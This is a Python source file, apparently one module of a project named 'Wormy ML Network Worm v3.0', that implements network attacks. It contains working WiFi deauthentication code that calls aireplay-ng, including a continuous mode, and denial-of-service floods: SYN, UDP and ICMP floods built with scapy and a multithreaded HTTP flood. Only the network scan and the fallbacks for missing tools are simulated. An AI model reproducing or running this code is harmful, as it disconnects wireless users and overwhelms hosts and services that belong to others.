"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Network Attack Module
WiFi deauthentication and traffic saturation attacks
"""


import os
import random
import subprocess
import sys
import threading
import time
from typing import Dict, List

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class WiFiDeauth:
    """
    WiFi Deauthentication Attack
    Disconnects clients from WiFi networks
    """

    def __init__(self):
        self.running = False
        self.interface = None
        logger.info("WiFi Deauth module initialized")

    def set_monitor_mode(self, interface: str) -> bool:
        """
        Set wireless interface to monitor mode

        Args:
            interface: Wireless interface (e.g., 'wlan0')

        Returns:
            True if successful
        """
        try:
            logger.info(f"Setting {interface} to monitor mode")

            # Bring interface down
            subprocess.run(["ifconfig", interface, "down"], check=True)

            # Set monitor mode
            subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)

            # Bring interface up
            subprocess.run(["ifconfig", interface, "up"], check=True)

            self.interface = interface
            logger.success(f"{interface} set to monitor mode")
            return True

        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to set monitor mode: {e}")
            return False
        except FileNotFoundError:
            logger.warning("iwconfig/ifconfig not found - using simulation mode")
            self.interface = interface
            return True

    def scan_networks(self, duration: int = 10) -> List[Dict]:
        """
        Scan for WiFi networks

        Args:
            duration: Scan duration in seconds

        Returns:
            List of discovered networks
        """
        logger.info(f"Scanning for WiFi networks ({duration}s)")

        try:
            # Use airodump-ng to scan
            # Real implementation would parse airodump output

            # Simulated networks
            networks = [
                {"bssid": "AA:BB:CC:DD:EE:01", "essid": "HomeNetwork", "channel": 6, "clients": 3},
                {"bssid": "AA:BB:CC:DD:EE:02", "essid": "OfficeWiFi", "channel": 11, "clients": 5},
                {"bssid": "AA:BB:CC:DD:EE:03", "essid": "GuestNetwork", "channel": 1, "clients": 2},
            ]

            logger.info(f"Found {len(networks)} networks")
            return networks

        except Exception as e:
            logger.error(f"Network scan failed: {e}")
            return []

    def deauth_attack(self, bssid: str, client: str = None, count: int = 10) -> bool:
        """
        Perform deauthentication attack

        Args:
            bssid: Target AP BSSID
            client: Target client MAC (None = broadcast)
            count: Number of deauth packets

        Returns:
            True if successful
        """
        if not self.interface:
            logger.error("Interface not set to monitor mode")
            return False

        target = client or "FF:FF:FF:FF:FF:FF"
        logger.info(f"Deauth attack: {bssid} -> {target} ({count} packets)")

        try:
            # Use aireplay-ng for deauth
            cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", target, self.interface]

            subprocess.run(cmd, check=True, timeout=30)
            logger.success(f"Deauth attack completed: {count} packets sent")
            return True

        except FileNotFoundError:
            logger.warning("aireplay-ng not found - simulating attack")
            time.sleep(2)
            logger.success(f"[SIMULATED] Deauth attack: {count} packets sent")
            return True

        except Exception as e:
            logger.error(f"Deauth attack failed: {e}")
            return False

    def continuous_deauth(self, bssid: str, interval: int = 5):
        """
        Continuous deauthentication attack

        Args:
            bssid: Target AP BSSID
            interval: Seconds between attacks
        """
        self.running = True
        logger.info(f"Starting continuous deauth on {bssid}")

        while self.running:
            self.deauth_attack(bssid, count=10)
            time.sleep(interval)

        logger.info("Continuous deauth stopped")

    def stop(self):
        """Stop continuous attack"""
        self.running = False


class TrafficSaturation:
    """
    Network Traffic Saturation (DoS)
    Floods target with packets
    """

    def __init__(self):
        self.running = False
        logger.info("Traffic Saturation module initialized")

    def syn_flood(self, target_ip: str, target_port: int = 80, duration: int = 60):
        """
        SYN flood attack

        Args:
            target_ip: Target IP address
            target_port: Target port
            duration: Attack duration in seconds
        """
        logger.info(f"SYN flood: {target_ip}:{target_port} for {duration}s")

        try:
            from scapy.all import IP, TCP, RandShort, send

            self.running = True
            start_time = time.time()
            packets_sent = 0

            while self.running and (time.time() - start_time) < duration:
                # Create SYN packet with random source port
                packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")

                # Send packet
                send(packet, verbose=0)
                packets_sent += 1

                if packets_sent % 100 == 0:
                    logger.debug(f"SYN flood: {packets_sent} packets sent")

            logger.success(f"SYN flood completed: {packets_sent} packets sent")
            return True

        except ImportError:
            logger.warning("Scapy not available - simulating attack")
            time.sleep(duration)
            logger.success(f"[SIMULATED] SYN flood: {duration}s")
            return True

        except Exception as e:
            logger.error(f"SYN flood failed: {e}")
            return False

    def udp_flood(self, target_ip: str, target_port: int = 53, duration: int = 60):
        """
        UDP flood attack

        Args:
            target_ip: Target IP address
            target_port: Target port
            duration: Attack duration in seconds
        """
        logger.info(f"UDP flood: {target_ip}:{target_port} for {duration}s")

        try:
            from scapy.all import IP, UDP, Raw, send

            self.running = True
            start_time = time.time()
            packets_sent = 0

            while self.running and (time.time() - start_time) < duration:
                # Create UDP packet with random payload
                payload = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=1024))
                packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=payload)

                # Send packet
                send(packet, verbose=0)
                packets_sent += 1

                if packets_sent % 100 == 0:
                    logger.debug(f"UDP flood: {packets_sent} packets sent")

            logger.success(f"UDP flood completed: {packets_sent} packets sent")
            return True

        except ImportError:
            logger.warning("Scapy not available - simulating attack")
            time.sleep(duration)
            logger.success(f"[SIMULATED] UDP flood: {duration}s")
            return True

        except Exception as e:
            logger.error(f"UDP flood failed: {e}")
            return False

    def icmp_flood(self, target_ip: str, duration: int = 60):
        """
        ICMP flood (ping flood)

        Args:
            target_ip: Target IP address
            duration: Attack duration in seconds
        """
        logger.info(f"ICMP flood: {target_ip} for {duration}s")

        try:
            from scapy.all import ICMP, IP, send

            self.running = True
            start_time = time.time()
            packets_sent = 0

            while self.running and (time.time() - start_time) < duration:
                # Create ICMP packet
                packet = IP(dst=target_ip) / ICMP()

                # Send packet
                send(packet, verbose=0)
                packets_sent += 1

                if packets_sent % 100 == 0:
                    logger.debug(f"ICMP flood: {packets_sent} packets sent")

            logger.success(f"ICMP flood completed: {packets_sent} packets sent")
            return True

        except ImportError:
            logger.warning("Scapy not available - simulating attack")
            time.sleep(duration)
            logger.success(f"[SIMULATED] ICMP flood: {duration}s")
            return True

        except Exception as e:
            logger.error(f"ICMP flood failed: {e}")
            return False

    def http_flood(self, target_url: str, duration: int = 60, threads: int = 10):
        """
        HTTP flood (Layer 7 DoS)

        Args:
            target_url: Target URL
            duration: Attack duration in seconds
            threads: Number of concurrent threads
        """
        logger.info(f"HTTP flood: {target_url} for {duration}s ({threads} threads)")

        def flood_worker():
            import requests

            start_time = time.time()
            requests_sent = 0

            while self.running and (time.time() - start_time) < duration:
                try:
                    requests.get(target_url, timeout=5)
                    requests_sent += 1
                except Exception:
                    pass

            logger.debug(f"Thread completed: {requests_sent} requests sent")

        try:
            import requests

            self.running = True

            # Start worker threads
            workers = []
            for i in range(threads):
                t = threading.Thread(target=flood_worker, daemon=True)
                t.start()
                workers.append(t)

            # Wait for completion
            for t in workers:
                t.join()

            logger.success(f"HTTP flood completed")
            return True

        except ImportError:
            logger.warning("Requests not available - simulating attack")
            time.sleep(duration)
            logger.success(f"[SIMULATED] HTTP flood: {duration}s")
            return True

        except Exception as e:
            logger.error(f"HTTP flood failed: {e}")
            return False

    def stop(self):
        """Stop attack"""
        self.running = False


if __name__ == "__main__":
    print("=" * 60)
    print("NETWORK ATTACK MODULE TEST")
    print("=" * 60)

    # Test WiFi Deauth
    print("\n[1] WiFi Deauthentication")
    wifi = WiFiDeauth()
    wifi.set_monitor_mode("wlan0")
    networks = wifi.scan_networks(duration=5)
    print(f"Found {len(networks)} networks")

    if networks:
        target = networks[0]
        print(f"Targeting: {target['essid']} ({target['bssid']})")
        wifi.deauth_attack(target["bssid"], count=5)

    # Test Traffic Saturation
    print("\n[2] Traffic Saturation")
    dos = TrafficSaturation()

    print("Testing SYN flood (simulated)...")
    dos.syn_flood("192.168.1.1", duration=5)

    print("\n=" * 60)
